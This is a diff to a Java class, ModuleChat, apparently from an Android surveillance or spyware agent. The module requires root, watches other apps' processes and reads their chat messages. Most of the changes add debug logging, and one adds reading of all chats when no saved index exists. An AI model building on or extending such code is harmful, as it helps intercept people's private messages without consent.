@@ -41,9 +41,11 @@ public class ModuleChat extends BaseModule implements Observer<ProcessInfo> {
 	@Override
 	protected boolean parse(ConfModule conf) {
 		if (Status.self().haveRoot()) {
-
 			return true;
 		} else {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (parse), don't have root, bailing out");
+			}
 			return false;
 		}
 	}
@@ -75,9 +77,17 @@ public class ModuleChat extends BaseModule implements Observer<ProcessInfo> {
 						Check.log(TAG + " (actualStart): " + key + " -> " + hastableConversationLastIndex.get(key));
 					}
 				}
+			}else{
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (actualStart), get all Chats");
+				}
+				readChatMessages();
 			}
 		} catch (Exception e) {
-
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (actualStart), " + e);
+				e.printStackTrace();
+			}
 		}
 		ListenerProcess.self().attach(this);
 	}
@@ -98,6 +108,9 @@ public class ModuleChat extends BaseModule implements Observer<ProcessInfo> {
 		if (process.processInfo.processName.contains(pObserving)) {
 			if (process.status == ProcessStatus.STOP) {
 				try {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (notification), observing found: " + process.processInfo.processName);
+					}
 					readChatMessages();
 				} catch (IOException e) {
 					if (Cfg.DEBUG) {
